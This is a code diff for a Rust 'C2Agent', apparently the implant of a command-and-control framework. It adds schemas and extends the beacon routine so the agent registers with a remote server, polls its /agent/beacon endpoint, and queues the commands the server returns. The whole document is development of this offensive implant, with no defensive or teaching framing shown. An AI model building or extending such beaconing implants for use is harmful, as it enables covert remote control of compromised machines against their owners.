@@ -1,11 +1,17 @@
-mod config;
+mod macros;
+mod schemas;
 mod systeminfo;
 
-use config::{
-    AgentConfig
+use chrono::{
+    Local,
 };
 use reqwest::{
     Client
+};
+use schemas::{
+    AgentConfig,
+    BeaconResponse,
+    Command,
 };
 use serde_json::{
     json,
@@ -27,7 +33,8 @@ pub struct C2Agent {
     id: u64,
     agent_config: AgentConfig,
     http_client: Client,
-    system_info: SystemInfo
+    system_info: SystemInfo,
+    commands: Vec<Command>,
 }
 
 impl C2Agent {
@@ -45,7 +52,8 @@ impl C2Agent {
             "name": agent_name
         });
 
-        let response: Value = client.post(register_url)
+        let response: Value = client
+            .post(register_url)
             .json(&request_body)
             .send()
             .await?
@@ -70,6 +78,7 @@ impl C2Agent {
             agent_config: agent_config,
             http_client: client,
             system_info: get_system_info()?,
+            commands: Vec::new(),
         })
     }
 
@@ -96,18 +105,39 @@ impl C2Agent {
     }
 
     pub async fn send_beacon(&mut self) -> Result<(), Box<dyn std::error::Error>> {
+        let mut new_command_count = 0;
         let beacon_url = format!("{}/agent/beacon", self.agent_config.server_url);
         let request_body = json!({
             "name": self.agent_config.name,
             "uid": self.id,
         });
 
+        info!("Beaconing to server...");
+
         // Send beacon request
-        let _ = self.http_client.post(beacon_url)
+        let response: BeaconResponse = self.http_client
+            .post(beacon_url)
             .json(&request_body)
             .send()
+            .await?
+            .error_for_status()?
+            .json()
             .await?;
-        
+
+        // Retrieve commands
+        let commands = response.commands;
+        // Only add new commands to memory
+        if !commands.is_empty() {
+            for command in commands {
+                if !self.commands.contains(&command) {
+                    new_command_count += 1;
+                    self.commands.push(command);
+                }
+            }
+        }
+
+        info!("Added {} new commands", new_command_count);
+
         Ok(())
     }
 }
